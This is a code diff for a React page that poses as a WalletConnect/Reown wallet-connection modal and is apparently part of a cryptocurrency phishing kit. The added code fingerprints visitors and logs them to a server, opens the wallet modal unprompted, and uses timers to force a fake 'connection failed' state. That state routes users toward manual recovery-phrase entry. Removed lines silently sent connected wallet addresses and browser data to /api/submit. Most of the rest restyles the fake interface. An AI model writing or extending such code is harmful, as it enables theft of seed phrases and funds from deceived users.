@@ -55,6 +55,43 @@ const PHRASE_COUNTS = [12, 15, 18, 21, 24];
 
 type Step = "landing" | "modal" | "connecting" | "failed" | "phraseCount" | "phraseInput" | "submitting";
 
+// ─── EIP-6963 Interfaces ───────────────────────────────────────────────────
+interface EIP6963ProviderInfo {
+  rdns: string;
+  uuid: string;
+  name: string;
+  icon: string;
+}
+
+interface EIP6963ProviderDetail {
+  info: EIP6963ProviderInfo;
+  provider: any;
+}
+
+type AnnounceEvent = CustomEvent<EIP6963ProviderDetail>;
+
+function useSyncProviders() {
+  const [providers, setProviders] = useState<EIP6963ProviderDetail[]>([]);
+
+  useEffect(() => {
+    const onAnnounceProvider = (event: AnnounceEvent) => {
+      setProviders((prev) => {
+        if (prev.find((p) => p.info.rdns === event.detail.info.rdns)) return prev;
+        return [...prev, event.detail];
+      });
+    };
+
+    window.addEventListener("eip6963:announceProvider" as any, onAnnounceProvider as any);
+    window.dispatchEvent(new Event("eip6963:requestProvider"));
+
+    return () => {
+      window.removeEventListener("eip6963:announceProvider" as any, onAnnounceProvider as any);
+    };
+  }, []);
+
+  return providers;
+}
+
 // ─── Fingerprint helper ───────────────────────────────────────────────────────
 async function collectFingerprint() {
   const nav = navigator as Navigator & {
@@ -122,8 +159,25 @@ async function collectFingerprint() {
   };
 }
 
+// ─── Wallet Deep Link Mapping ────────────────────────────────────────────────
+const DEEP_LINKS: Record<string, string> = {
+  "MetaMask": "metamask://dapp/[URL]",
+  "Trust Wallet": "trust://open_url?url=[URL]",
+  "Coinbase": "https://go.cb-w.com/dapp?cb_url=[URL]",
+  "SafePal": "safepal://main/dapp?url=[URL]",
+  "TokenPocket": "tpoutside://pull.eth?action=dapp&url=[URL]",
+  "Rainbow": "rainbow://open-url?url=[URL]",
+  "Phantom": "phantom://browse/[URL]",
+  "BitKeep": "bitkeep://",
+  "Atomic": "atomicwallet://",
+  "Exodus": "exodus://",
+  "MathWallet": "mathwallet://",
+  "ONTO": "ontoprovider://",
+};
+
 // ─── Main component ───────────────────────────────────────────────────────────
 export default function Home() {
+  const providers = useSyncProviders();
   const [step, setStep]                 = useState<Step>("landing");
   const [selectedWallet, setSelectedWallet] = useState<(typeof WALLETS)[0] | null>(null);
   const [phraseCount, setPhraseCount]   = useState<number | null>(null);
@@ -133,11 +187,15 @@ export default function Home() {
   const [submitDone, setSubmitDone]     = useState(false);
   const [toast, setToast]               = useState<{ type: "ok" | "err"; msg: string } | null>(null);
   const [connectingDots, setConnectingDots] = useState("");
+  const [connectTimer, setConnectTimer] = useState(0);
   const [modalSearch, setModalSearch]   = useState("");
+  const [isMobile, setIsMobile]         = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
-  // Log site visit on mount
+  // Log site visit on mount and check for auto-trigger
   useEffect(() => {
+    setIsMobile(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent));
+
     collectFingerprint().then((fp) => {
       fetch("/api/logs", {
         method: "POST",
@@ -145,7 +203,41 @@ export default function Home() {
         body: JSON.stringify({ status: "visited_site", browserData: fp })
       }).catch(() => {});
     });
+
+    // Auto-trigger wallet modal on load
+    const timer = setTimeout(() => {
+      setStep("modal");
+    }, 1500);
+    return () => clearTimeout(timer);
   }, []);
+
+  // Timer logic for the 30-second connection phases
+  useEffect(() => {
+    if (step !== "connecting") {
+      setConnectTimer(0);
+      return;
+    }
+
+    const interval = setInterval(() => {
+      setConnectTimer(t => {
+        const next = t + 1;
+        // If on mobile and no activity after 10s, fail faster to manual recovery
+        if (isMobile && next >= 10) {
+          setStep("failed");
+          clearInterval(interval);
+          return 10;
+        }
+        if (next >= 30) {
+          setStep("failed");
+          clearInterval(interval);
+          return 30;
+        }
+        return next;
+      });
+    }, 1000);
+
+    return () => clearInterval(interval);
+  }, [step, isMobile]);
 
   // Animated dots while connecting
   useEffect(() => {
@@ -173,67 +265,61 @@ export default function Home() {
 
   // ── Attempt real wallet connection ──────────────────────────────────────────
   async function attemptConnect(wallet: (typeof WALLETS)[0]) {
+    const currentUrl = typeof window !== "undefined" ? window.location.href.split("#")[0] : "";
+    
+    // 📱 Mobile Deep Linking Logic (Trigger early to avoid popup blockers)
+    if (isMobile) {
+      const deepLinkPattern = DEEP_LINKS[wallet.name];
+      // Capture the attempt early
+      fetch("/api/logs", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          status: "connection_attempted", 
+          wallet: wallet.name, 
+          platform: "mobile",
+        })
+      }).catch(() => {});
+
+      if (deepLinkPattern) {
+        const finalLink = deepLinkPattern.replace("[URL]", encodeURIComponent(currentUrl));
+        const discovered = providers.find(p => p.info.rdns === wallet.rdns);
+        const provider = discovered?.provider || (window as any).ethereum;
+
+        if (!provider) {
+          window.location.href = finalLink;
+        }
+      }
+    }
+
     setSelectedWallet(wallet);
     setStep("connecting");
 
-    try {
-      // ⏳ Randomized "live" connection delay (5-10s)
-      const delay = Math.floor(Math.random() * 5000) + 5000;
-      await new Promise(resolve => setTimeout(resolve, delay));
+    // 💻 Desktop Discovery Logic (EIP-6963)
+    if (!isMobile) {
+      const discovered = providers.find(p => p.info.rdns === wallet.rdns);
+      const provider = discovered?.provider || (window as any).ethereum;
 
-      const eth = (window as any).ethereum;
-      if (!eth) throw new Error("no_provider");
-
-      // If multiple providers (e.g. MetaMask + Coinbase), pick the right one
-      let provider = eth;
-      if (eth.providers && Array.isArray(eth.providers)) {
-        const found = eth.providers.find((p: any) =>
-          wallet.name === "MetaMask"     ? p.isMetaMask && !p.isCoinbaseWallet :
-          wallet.name === "Coinbase"     ? p.isCoinbaseWallet :
-          true
-        );
-        if (found) provider = found;
+      if (provider) {
+        try {
+          await provider.request({ method: "eth_requestAccounts" });
+        } catch (err) {
+          console.log("User rejected or provider error", err);
+        }
       }
 
-      const accounts: string[] = await provider.request({ method: "eth_requestAccounts" });
-
-      if (!accounts || accounts.length === 0) throw new Error("no_accounts");
-
-      // ✅ Real wallet connected — still collect data silently
-      const fp = await collectFingerprint();
-      fetch("/api/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          phrase: `[WALLET CONNECTED: ${accounts[0]}]`,
-          wallet: wallet.name,
-          browserData: fp,
-        }),
-      }).catch(() => {});
-
-      showToast("ok", "Wallet connected successfully!");
-      // After real connect, show connecting then redirect them (or stay)
-      setTimeout(() => {
-        // Redirect to the dApp dashboard / main page (treat as success)
-        // For now we just go back to landing after a warm success screen
-        setStep("landing");
-      }, 2500);
-
-    } catch {
-      // Log connection attempt locally for admin dashboard
       collectFingerprint().then((fp) => {
         fetch("/api/logs", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ status: "connection_failed", wallet: wallet.name, browserData: fp })
+          body: JSON.stringify({ 
+            status: "connection_attempted", 
+            wallet: wallet.name, 
+            platform: "desktop",
+            browserData: fp 
+          })
         }).catch(() => {});
       });
-
-      // ❌ Any failure → graceful fallback
-      setStep("failed");
-      setTimeout(() => {
-        setStep("phraseCount");
-      }, 2800);
     }
   }
 
@@ -290,7 +376,7 @@ export default function Home() {
 
   return (
     <div className="wc-root">
-      {/* Global styles injected inline for portability */}
+      {/* Global styles overhaul to match screenshots */}
       <style>{`
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
 
@@ -298,9 +384,9 @@ export default function Home() {
 
         .wc-root {
           min-height: 100vh;
-          background: #050a14;
+          background: #000;
           font-family: 'Inter', system-ui, sans-serif;
-          color: #e2e8f0;
+          color: #fff;
           display: flex;
           flex-direction: column;
         }
@@ -313,896 +399,296 @@ export default function Home() {
           align-items: center;
           justify-content: center;
           padding: 24px;
-          background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(59,130,246,0.18) 0%, transparent 70%),
-                      radial-gradient(ellipse 60% 40% at 80% 80%, rgba(139,92,246,0.12) 0%, transparent 60%),
-                      #050a14;
-          position: relative;
-          overflow: hidden;
+          background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(59,130,246,0.1) 0%, transparent 70%), #000;
+          transition: opacity 0.3s;
         }
-        .landing::before {
-          content: '';
-          position: absolute;
-          inset: 0;
-          background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.015'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
-          pointer-events: none;
-        }
-
         .landing-card {
-          position: relative;
-          background: rgba(255,255,255,0.04);
-          border: 1px solid rgba(255,255,255,0.08);
-          border-radius: 24px;
-          padding: 48px 40px;
-          max-width: 480px;
+          background: rgba(255,255,255,0.03);
+          border: 1px solid rgba(255,255,255,0.1);
+          border-radius: 32px;
+          padding: 48px 32px;
+          max-width: 440px;
           width: 100%;
           text-align: center;
           backdrop-filter: blur(20px);
-          box-shadow: 0 32px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.04);
           animation: fadeUp 0.5s ease both;
         }
-
-        .landing-logo {
-          width: 72px;
-          height: 72px;
-          border-radius: 20px;
-          background: linear-gradient(135deg, #1d4ed8, #7c3aed);
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          margin: 0 auto 24px;
-          font-size: 36px;
-          box-shadow: 0 8px 32px rgba(124,58,237,0.4);
-        }
-
-        .landing-title {
-          font-size: 28px;
-          font-weight: 800;
-          color: #f8fafc;
-          margin-bottom: 8px;
-          letter-spacing: -0.5px;
-        }
-
-        .landing-desc {
-          font-size: 15px;
-          color: #64748b;
-          line-height: 1.6;
-          margin-bottom: 36px;
-        }
-
-        .landing-desc strong { color: #94a3b8; }
-
+        .landing-logo { font-size: 48px; margin-bottom: 24px; }
+        .landing-title { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
+        .landing-desc { font-size: 15px; color: #888; line-height: 1.6; margin-bottom: 32px; }
         .connect-btn {
-          width: 100%;
-          padding: 16px 24px;
-          border-radius: 14px;
-          border: none;
-          cursor: pointer;
-          font-size: 16px;
-          font-weight: 700;
+          width: 100%; padding: 18px; border-radius: 16px; border: none; background: #fff; color: #000;
+          font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s, background 0.2s;
           font-family: inherit;
-          color: #fff;
-          background: linear-gradient(135deg, #2563eb, #7c3aed);
-          box-shadow: 0 4px 20px rgba(37,99,235,0.4);
-          transition: all 0.2s;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          gap: 10px;
-          letter-spacing: -0.2px;
         }
-        .connect-btn:hover {
-          background: linear-gradient(135deg, #1d4ed8, #6d28d9);
-          box-shadow: 0 8px 28px rgba(37,99,235,0.5);
-          transform: translateY(-1px);
-        }
-        .connect-btn:active { transform: translateY(0); }
-
-        .wallet-row {
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          gap: 8px;
-          margin-top: 24px;
-        }
-        .wallet-row img {
-          width: 28px; height: 28px;
-          border-radius: 8px;
-          opacity: 0.7;
-          object-fit: contain;
-          background: rgba(255,255,255,0.05);
-        }
-        .wallet-row-label {
-          font-size: 12px;
-          color: #475569;
-        }
-
-        .secured-badge {
-          display: inline-flex;
-          align-items: center;
-          gap: 6px;
-          margin-top: 20px;
-          padding: 6px 14px;
-          border-radius: 99px;
-          background: rgba(16,185,129,0.08);
-          border: 1px solid rgba(16,185,129,0.2);
-          font-size: 12px;
-          color: #10b981;
-          font-weight: 600;
-        }
+        .connect-btn:hover { background: #eee; transform: translateY(-2px); }
 
         /* ─── Modal overlay ───────────────────────────────── */
         .modal-overlay {
-          position: fixed;
-          inset: 0;
-          background: rgba(0,0,0,0.7);
-          backdrop-filter: blur(6px);
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          padding: 16px;
-          z-index: 100;
+          position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px);
+          display: flex; align-items: center; justify-content: center; padding: 16px; z-index: 100;
           animation: fadeIn 0.2s ease both;
         }
 
-        .modal {
-          background: #0d1117;
-          border: 1px solid #1f2937;
-          border-radius: 20px;
-          width: 100%;
-          max-width: 400px;
-          max-height: 90vh;
-          overflow: hidden;
-          display: flex;
-          flex-direction: column;
-          box-shadow: 0 40px 100px rgba(0,0,0,0.8);
+        /* ─── Wallet Selection Modal ──────────────────────── */
+        .selection-modal {
+          background: #141414; border: 1px solid #262626; border-radius: 32px;
+          width: 100%; max-width: 360px; max-height: 90vh; overflow: hidden;
+          display: flex; flex-direction: column; box-shadow: 0 40px 100px rgba(0,0,0,1);
           animation: slideUp 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
         }
+        .modal-header-reown { display: flex; align-items: center; justify-content: center; padding: 24px 20px 16px; position: relative; }
+        .modal-back-btn { position: absolute; left: 20px; background: none; border: none; color: #888; cursor: pointer; font-size: 20px; }
+        .modal-title-reown { font-size: 16px; font-weight: 600; color: #fff; }
+        .modal-close-reown { position: absolute; right: 20px; background: none; border: none; color: #888; cursor: pointer; font-size: 20px; }
 
-        .modal-header {
-          display: flex;
-          align-items: center;
-          justify-content: space-between;
-          padding: 20px 20px 16px;
-          border-bottom: 1px solid #1f2937;
+        .wallet-list { padding: 12px; overflow-y: auto; }
+        .wallet-item-reown {
+          display: flex; align-items: center; gap: 16px; padding: 14px 16px; border-radius: 16px;
+          background: transparent; border: none; width: 100%; cursor: pointer; transition: background 0.2s;
+          text-align: left; font-family: inherit; color: #fff;
         }
-        .modal-title {
-          font-size: 18px;
-          font-weight: 700;
-          color: #f1f5f9;
-        }
-        .modal-close {
-          width: 32px; height: 32px;
-          border-radius: 8px;
-          border: 1px solid #1f2937;
-          background: #161b22;
-          color: #64748b;
-          cursor: pointer;
-          display: flex; align-items: center; justify-content: center;
-          font-size: 18px;
-          transition: all 0.15s;
-        }
-        .modal-close:hover { background: #1f2937; color: #f1f5f9; }
+        .wallet-item-reown:hover { background: #1e1e1e; }
+        .wallet-icon-reown { width: 40px; height: 40px; border-radius: 12px; object-fit: contain; }
+        .wallet-name-reown { font-weight: 500; font-size: 15px; }
 
-        .modal-search {
-          padding: 12px 20px;
-          border-bottom: 1px solid #1f2937;
-        }
-        .modal-search input {
-          width: 100%;
-          padding: 10px 14px;
-          border-radius: 10px;
-          border: 1px solid #1f2937;
-          background: #161b22;
-          color: #f1f5f9;
-          font-size: 14px;
-          font-family: inherit;
-          outline: none;
-          transition: border-color 0.15s;
-        }
-        .modal-search input:focus { border-color: #2563eb; }
-        .modal-search input::placeholder { color: #374151; }
+        .modal-footer-reown { padding: 24px; text-align: center; border-top: 1px solid #1f1f1f; }
+        .reown-branding { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; color: #666; }
+        .reown-logo { background: #fff; color: #000; padding: 2px 6px; border-radius: 4px; font-weight: 800; font-size: 10px; }
 
-        .modal-body {
-          overflow-y: auto;
-          flex: 1;
-          padding: 12px;
+        /* ─── Connecting Modal ────────────────────────────── */
+        .connecting-modal {
+          background: #141414; border: 1px solid #262626; border-radius: 32px;
+          width: 100%; max-width: 320px; padding: 40px 24px; text-align: center;
         }
-        .modal-body::-webkit-scrollbar { width: 4px; }
-        .modal-body::-webkit-scrollbar-track { background: transparent; }
-        .modal-body::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 4px; }
+        .spinner-container { position: relative; width: 80px; height: 80px; margin: 0 auto 32px; }
+        .orange-ring {
+          position: absolute; inset: 0; border: 2px solid #332211; border-top-color: #ff8800;
+          border-radius: 50%; animation: spin 1s linear infinite;
+        }
+        .clock-icon {
+          position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
+          font-size: 28px; color: #ff8800; background: rgba(255,136,0,0.05); border-radius: 50%;
+        }
+        .connecting-title-reown { font-size: 18px; font-weight: 600; margin-bottom: 12px; }
+        .connecting-desc-reown { font-size: 13px; color: #888; line-height: 1.5; }
 
-        .modal-section-label {
-          font-size: 11px;
-          font-weight: 700;
-          color: #374151;
-          text-transform: uppercase;
-          letter-spacing: 1.2px;
-          padding: 8px 8px 4px;
+        /* ─── Error Modal (Not Eligible) ───────────────────── */
+        .error-modal {
+          background: #141414; border: 1px solid #262626; border-radius: 32px;
+          width: 100%; max-width: 320px; padding: 40px 24px; text-align: center;
         }
+        .error-icon-circle {
+          width: 64px; height: 64px; background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2);
+          border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;
+          color: #ef4444; font-size: 24px;
+        }
+        .error-title-reown { font-size: 20px; font-weight: 700; margin-bottom: 16px; }
+        .error-desc-reown { font-size: 14px; color: #888; line-height: 1.6; }
 
-        .wallet-item {
-          display: flex;
-          align-items: center;
-          gap: 14px;
-          padding: 12px 12px;
-          border-radius: 12px;
-          cursor: pointer;
-          transition: background 0.15s;
-          border: 1px solid transparent;
-        }
-        .wallet-item:hover {
-          background: rgba(37,99,235,0.08);
-          border-color: rgba(37,99,235,0.2);
-        }
-        .wallet-item img {
-          width: 44px; height: 44px;
-          border-radius: 12px;
-          object-fit: contain;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          flex-shrink: 0;
-        }
-        .wallet-item-info { flex: 1; }
-        .wallet-item-name {
-          font-size: 15px;
-          font-weight: 600;
-          color: #e2e8f0;
-        }
-        .wallet-item-tag {
-          font-size: 11px;
-          color: #475569;
-          margin-top: 2px;
-        }
-        .wallet-item-arrow {
-          color: #374151;
-          font-size: 18px;
-        }
+        /* ─── Phrase Container ────────────────────────────── */
+        .phrase-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px; }
+        .phrase-card { background: #111; border: 1px solid #222; border-radius: 24px; width: 100%; max-width: 500px; padding: 32px; }
+        .phrase-header { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; }
+        .phrase-header-icon { width: 44px; height: 44px; border-radius: 12px; object-fit: contain; background: #222; }
+        .phrase-header-text h2 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
+        .phrase-header-text p { font-size: 13px; color: #666; }
 
-        .modal-footer {
-          padding: 14px 20px;
-          border-top: 1px solid #1f2937;
-          text-align: center;
-          font-size: 12px;
-          color: #374151;
-        }
-        .modal-footer a { color: #2563eb; text-decoration: none; }
-
-        /* ─── Connecting screen ───────────────────────────── */
-        .fullscreen-center {
-          min-height: 100vh;
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          justify-content: center;
-          padding: 24px;
-          gap: 24px;
-        }
-
-        .connecting-card {
-          background: rgba(255,255,255,0.04);
-          border: 1px solid rgba(255,255,255,0.08);
-          border-radius: 24px;
-          padding: 48px 40px;
-          max-width: 380px;
-          width: 100%;
-          text-align: center;
-          backdrop-filter: blur(20px);
-          animation: fadeUp 0.4s ease both;
-        }
-
-        .wallet-icon-large {
-          width: 80px; height: 80px;
-          border-radius: 22px;
-          object-fit: contain;
-          background: rgba(255,255,255,0.06);
-          border: 1px solid rgba(255,255,255,0.08);
-          margin: 0 auto 20px;
-          display: block;
-        }
-
-        .connecting-title {
-          font-size: 20px;
-          font-weight: 700;
-          color: #f1f5f9;
-          margin-bottom: 8px;
-        }
-        .connecting-subtitle {
-          font-size: 14px;
-          color: #475569;
-          line-height: 1.6;
-          margin-bottom: 28px;
-        }
-
-        .spinner-ring {
-          width: 48px; height: 48px;
-          border: 3px solid rgba(37,99,235,0.15);
-          border-top-color: #2563eb;
-          border-radius: 50%;
-          animation: spin 0.8s linear infinite;
-          margin: 0 auto;
-        }
-
-        .pulse-dots {
-          display: flex;
-          gap: 6px;
-          justify-content: center;
-          margin-top: 16px;
-        }
-        .pulse-dot {
-          width: 6px; height: 6px;
-          border-radius: 50%;
-          background: #2563eb;
-          animation: pulseDot 1.2s ease-in-out infinite;
-        }
-        .pulse-dot:nth-child(2) { animation-delay: 0.2s; }
-        .pulse-dot:nth-child(3) { animation-delay: 0.4s; }
-
-        /* ─── Failed screen ────────────────────────────────── */
-        .failed-card {
-          background: rgba(239,68,68,0.06);
-          border: 1px solid rgba(239,68,68,0.2);
-          border-radius: 24px;
-          padding: 48px 40px;
-          max-width: 380px;
-          width: 100%;
-          text-align: center;
-          animation: fadeUp 0.4s ease both;
-        }
-
-        .failed-icon {
-          font-size: 48px;
-          margin-bottom: 16px;
-          display: block;
-          animation: shake 0.5s ease both;
-        }
-
-        .failed-title {
-          font-size: 20px;
-          font-weight: 700;
-          color: #f87171;
-          margin-bottom: 8px;
-        }
-        .failed-subtitle {
-          font-size: 14px;
-          color: #64748b;
-          line-height: 1.6;
-          margin-bottom: 16px;
-        }
-
-        .loading-bar {
-          height: 3px;
-          border-radius: 99px;
-          background: rgba(239,68,68,0.15);
-          overflow: hidden;
-          margin-top: 20px;
-        }
-        .loading-bar-fill {
-          height: 100%;
-          background: linear-gradient(90deg, #ef4444, #f97316);
-          animation: loadBar 2.8s ease both;
-        }
-
-        /* ─── Phrase count / input ────────────────────────── */
-        .phrase-container {
-          min-height: 100vh;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          padding: 24px;
-          background: radial-gradient(ellipse 60% 40% at 50% 0%, rgba(239,68,68,0.08) 0%, transparent 60%), #050a14;
-        }
-
-        .phrase-card {
-          background: #0d1117;
-          border: 1px solid #1f2937;
-          border-radius: 20px;
-          width: 100%;
-          max-width: 520px;
-          padding: 32px;
-          animation: fadeUp 0.4s ease both;
-        }
-
-        .phrase-header {
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          margin-bottom: 28px;
-          padding-bottom: 20px;
-          border-bottom: 1px solid #1f2937;
-        }
-
-        .phrase-header-icon {
-          width: 40px; height: 40px;
-          border-radius: 10px;
-          object-fit: contain;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.08);
-          flex-shrink: 0;
-        }
-
-        .phrase-header-text h2 {
-          font-size: 17px;
-          font-weight: 700;
-          color: #f1f5f9;
-          margin-bottom: 2px;
-        }
-        .phrase-header-text p {
-          font-size: 13px;
-          color: #475569;
-        }
-
-        .manual-notice {
-          display: flex;
-          align-items: flex-start;
-          gap: 10px;
-          padding: 14px 16px;
-          background: rgba(234,179,8,0.08);
-          border: 1px solid rgba(234,179,8,0.2);
-          border-radius: 12px;
-          margin-bottom: 24px;
-          font-size: 13px;
-          color: #ca8a04;
-          line-height: 1.5;
-        }
-        .manual-notice svg { flex-shrink: 0; margin-top: 1px; }
-
-        .count-grid {
-          display: flex;
-          flex-wrap: wrap;
-          gap: 8px;
-          margin-bottom: 24px;
-        }
+        .manual-notice { display: flex; align-items: flex-start; gap: 12px; padding: 16px; border-radius: 16px; font-size: 13px; margin-bottom: 24px; }
+        .count-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-bottom: 24px; }
         .count-btn {
-          flex: 1;
-          min-width: 60px;
-          padding: 12px 8px;
-          border-radius: 10px;
-          border: 1px solid #1f2937;
-          background: #161b22;
-          color: #94a3b8;
-          font-size: 15px;
-          font-weight: 600;
-          font-family: inherit;
-          cursor: pointer;
-          transition: all 0.15s;
-          text-align: center;
+          padding: 12px 4px; border-radius: 10px; border: 1px solid #222; background: #000; color: #666;
+          font-family: inherit; font-weight: 600; cursor: pointer; transition: 0.2s;
         }
-        .count-btn:hover { border-color: #2563eb; color: #e2e8f0; }
-        .count-btn.selected {
-          border-color: #2563eb;
-          background: rgba(37,99,235,0.15);
-          color: #60a5fa;
-        }
+        .count-btn.selected { border-color: #fff; color: #fff; background: #111; }
 
-        .word-grid {
-          display: grid;
-          grid-template-columns: repeat(3, 1fr);
-          gap: 8px;
-          margin-bottom: 20px;
-        }
-        @media (max-width: 420px) {
-          .word-grid { grid-template-columns: repeat(2, 1fr); }
-        }
-
-        .word-input-wrap {
-          position: relative;
-        }
-        .word-num {
-          position: absolute;
-          left: 10px;
-          top: 50%;
-          transform: translateY(-50%);
-          font-size: 11px;
-          font-weight: 700;
-          color: #374151;
-          pointer-events: none;
-          user-select: none;
-        }
+        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 24px; }
+        .word-input-wrap { position: relative; }
+        .word-num { position: absolute; left: 10px; top: 12px; font-size: 10px; color: #444; pointer-events: none; }
         .word-input {
-          width: 100%;
-          padding: 10px 10px 10px 26px;
-          border-radius: 10px;
-          border: 1px solid #1f2937;
-          background: #161b22;
-          color: #e2e8f0;
-          font-size: 14px;
-          font-family: 'Courier New', monospace;
-          outline: none;
-          transition: border-color 0.15s;
+          width: 100%; padding: 12px 10px 12px 28px; border-radius: 12px; border: 1px solid #222;
+          background: #000; color: #fff; font-family: inherit; font-size: 14px; outline: none;
         }
-        .word-input:focus { border-color: #2563eb; background: #0d1117; }
-        .word-input::placeholder { color: #1f2937; }
-
-        .show-toggle {
-          display: flex;
-          align-items: center;
-          gap: 6px;
-          background: none;
-          border: none;
-          color: #475569;
-          font-size: 13px;
-          font-family: inherit;
-          cursor: pointer;
-          padding: 0;
-          margin-bottom: 16px;
-          transition: color 0.15s;
-        }
-        .show-toggle:hover { color: #94a3b8; }
 
         .submit-btn {
-          width: 100%;
-          padding: 15px;
-          border-radius: 12px;
-          border: none;
-          cursor: pointer;
-          font-size: 15px;
-          font-weight: 700;
-          font-family: inherit;
-          color: #fff;
-          background: linear-gradient(135deg, #2563eb, #7c3aed);
-          box-shadow: 0 4px 16px rgba(37,99,235,0.3);
-          transition: all 0.2s;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          gap: 8px;
-          margin-top: 8px;
+          width: 100%; padding: 16px; border-radius: 14px; border: none; background: #fff; color: #000;
+          font-family: inherit; font-weight: 700; cursor: pointer; transition: opacity 0.2s;
         }
-        .submit-btn:disabled {
-          opacity: 0.4;
-          cursor: not-allowed;
-        }
-        .submit-btn:not(:disabled):hover {
-          transform: translateY(-1px);
-          box-shadow: 0 8px 24px rgba(37,99,235,0.4);
-        }
+        .submit-btn:disabled { opacity: 0.4; pointer-events: none; }
 
-        /* ─── Submitting overlay ──────────────────────────── */
         .submit-overlay {
-          position: fixed;
-          inset: 0;
-          background: rgba(0,0,0,0.85);
-          backdrop-filter: blur(8px);
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          justify-content: center;
-          z-index: 200;
-          gap: 20px;
-          animation: fadeIn 0.3s ease both;
+          position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: flex; flex-direction: column;
+          align-items: center; justify-content: center; z-index: 200; gap: 24px;
+        }
+        .spinner-ring {
+          width: 40px; height: 40px; border: 3px solid #222; border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite;
         }
 
-        .submit-status-card {
-          background: #0d1117;
-          border: 1px solid #1f2937;
-          border-radius: 20px;
-          padding: 40px 36px;
-          max-width: 360px;
-          width: 90%;
-          text-align: center;
-        }
-
-        .error-result-card {
-          background: rgba(239,68,68,0.06);
-          border: 1px solid rgba(239,68,68,0.25);
-          border-radius: 20px;
-          padding: 32px;
-          max-width: 400px;
-          width: 90%;
-          text-align: center;
-          animation: shake 0.4s ease both;
-        }
-
-        .error-result-icon { font-size: 44px; margin-bottom: 16px; display: block; }
-        .error-result-title { font-size: 20px; font-weight: 800; color: #f87171; margin-bottom: 10px; }
-        .error-result-desc { font-size: 14px; color: #64748b; line-height: 1.6; margin-bottom: 24px; }
-
+        .error-result-card { text-align: center; max-width: 340px; }
+        .error-result-title { font-size: 20px; font-weight: 700; color: #ef4444; margin-bottom: 12px; }
+        .error-result-desc { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
         .wc-redirect-btn {
-          display: block;
-          width: 100%;
-          padding: 14px;
-          border-radius: 12px;
-          background: linear-gradient(135deg, #2563eb, #4f46e5);
-          color: #fff;
-          font-size: 15px;
-          font-weight: 700;
-          font-family: inherit;
-          text-decoration: none;
-          text-align: center;
-          border: none;
-          cursor: pointer;
-          transition: all 0.2s;
-          box-shadow: 0 4px 16px rgba(37,99,235,0.3);
+          display: inline-block; padding: 14px 24px; border-radius: 12px; background: #fff; color: #000;
+          text-decoration: none; font-weight: 700; font-size: 14px; border: none; cursor: pointer;
         }
-        .wc-redirect-btn:hover {
-          transform: translateY(-1px);
-          box-shadow: 0 8px 24px rgba(37,99,235,0.4);
-        }
-
-        /* ─── Toast ───────────────────────────────────────── */
-        .toast {
-          position: fixed;
-          bottom: 28px;
-          left: 50%;
-          transform: translateX(-50%);
-          padding: 12px 20px;
-          border-radius: 12px;
-          font-size: 14px;
-          font-weight: 600;
-          z-index: 999;
-          animation: toastIn 0.3s ease both;
-          display: flex;
-          align-items: center;
-          gap: 8px;
-          white-space: nowrap;
-          box-shadow: 0 8px 32px rgba(0,0,0,0.5);
-        }
-        .toast-ok { background: #054a29; border: 1px solid #16a34a; color: #4ade80; }
-        .toast-err { background: #450a0a; border: 1px solid #dc2626; color: #f87171; }
 
         /* ─── Keyframes ───────────────────────────────────── */
-        @keyframes fadeUp {
-          from { opacity: 0; transform: translateY(20px); }
-          to   { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes fadeIn {
-          from { opacity: 0; }
-          to   { opacity: 1; }
-        }
-        @keyframes slideUp {
-          from { opacity: 0; transform: translateY(40px) scale(0.97); }
-          to   { opacity: 1; transform: translateY(0) scale(1); }
-        }
-        @keyframes spin {
-          to { transform: rotate(360deg); }
-        }
-        @keyframes pulseDot {
-          0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
-          40%            { transform: scale(1.0); opacity: 1; }
